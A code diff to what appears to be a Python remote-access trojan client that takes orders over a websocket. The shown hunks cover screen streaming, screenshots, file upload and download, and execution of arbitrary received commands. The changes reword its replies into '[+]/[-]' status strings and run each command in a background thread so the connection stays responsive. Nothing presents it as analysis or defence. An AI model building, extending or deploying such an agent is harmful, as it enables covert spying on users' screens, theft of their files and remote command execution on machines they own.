@@ -44,8 +44,8 @@ def stream_screen(ws):
             b64 = base64.b64encode(buffer).decode('utf-8')
             
             send(ws, {"t": "reply", "data": f"[STREAM] {b64}"})
-            time.sleep(0.2) # ~5 FPS to prevent buffer overflow
-    except Exception as e:
+            time.sleep(0.2) 
+    except Exception:
         pass
     finally:
         STREAM_EVENT.set()
@@ -119,9 +119,9 @@ def do_upload(ws, path, b64_data):
     try:
         with open(path, "wb") as f:
             f.write(base64.b64decode(b64_data))
-        send(ws, {"t": "upload_ack", "path": path, "ok": True})
+        send(ws, {"t": "reply", "data": f"[+] Upload complete: {path}\n"})
     except Exception as e:
-        send(ws, {"t": "upload_ack", "path": path, "ok": False, "err": str(e)})
+        send(ws, {"t": "reply", "data": f"[-] Upload failed: {e}\n"})
 
 def do_download(ws, path):
     try:
@@ -134,7 +134,7 @@ def do_download(ws, path):
             "size": len(data),
         })
     except Exception as e:
-        send(ws, {"t": "download", "path": path, "error": str(e)})
+        send(ws, {"t": "reply", "data": f"[-] Download failed: {e}\n"})
 
 def main():
     while True:
@@ -163,7 +163,8 @@ def main():
                     elif "screenshot" in cmd:
                         do_screenshot(ws)
                     else:
-                        run_cmd(ws, cmd)
+                        # Run command in a thread so it doesn't block the socket
+                        threading.Thread(target=run_cmd, args=(ws, cmd), daemon=True).start()
                 elif t == "upload":
                     do_upload(ws, frame.get("path"), frame.get("data"))
                 elif t == "download":
